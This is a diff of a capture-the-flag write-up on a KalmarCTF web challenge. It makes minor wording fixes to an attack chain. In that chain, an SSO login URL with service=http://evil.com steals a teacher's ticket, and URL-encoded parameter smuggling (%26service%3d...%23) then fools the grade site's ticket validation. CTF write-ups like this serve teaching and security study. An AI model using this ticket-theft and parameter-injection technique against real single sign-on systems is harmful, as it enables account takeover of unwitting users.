@@ -111,9 +111,9 @@ So by redirecting someone to `http://sso.chal-kalmarc.tf/login?service=http://ev
 
 ### A Ticket to Another Service
 
-So we might be able to get a ticket to another service. What can we do with it though?
+So we might be able to get a ticket to another service. What can we do with it?
 
-We still haven't tried to attack the validation process, so lets put ourselves in the developer's shoes and try to think about how they'd implement it.
+We still haven't tried to attack the ticket validation process of `grade.chal-kalmarc.tf`, so lets put ourselves in the developer's shoes and try to think about how they'd implement it.
 
 In pseudocode, it might be implemented in a way resembling:
 ```python
@@ -139,9 +139,9 @@ Notice that I URL-encoded key characters in the example above, `&`, `=` and `#`.
 
 So right now, our attack chain looks something like this:
 
-1. Set the `picture` field in the profile picture upload `HTTP` request to a URL structured like this: `http://sso.chal-kalmarc.tf/login?service=http://evil.com`, in which `evil.vom` is a domain under our control.
+1. Set the `picture` field in the profile picture upload `HTTP` request to a URL structured like this: `http://sso.chal-kalmarc.tf/login?service=http://evil.com`, in which `evil.com` is a domain under our control.
 2. We will press the `whine` button which will make the teacher view the grades, sending a `GET` request to the URL specified above.
-3. Because the teacher is already logged in to the `sso` service, they should be redirected to `http://evil.com?ticket=TGT-1234...`, with a ticket valid for `http://evil.com`.
+3. Because the teacher is already logged in to the `sso` service, they should be redirected to `http://evil.com?ticket=TGT-1234...`, with a ticket valid for the account of the teacher and `http://evil.com`.
 4. We listen for incoming requests on `http://evil.com`, and when one comes we save the ticket attached to it.
 5. We then request the following URL from our own web browser, with the ticket we just got:  `http://grade.chal-kalmarc.tf/login?ticket=TGT-1234...%26service%3dhttp://evil.com%23`
 4. The `grade` site makes the following `GET` request to `http://sso.chal-kalmarc.tf/validate?ticket=TGT-1234...&service=http://evil.com#&service=http://grade.chal-kalmarc.tf/login`
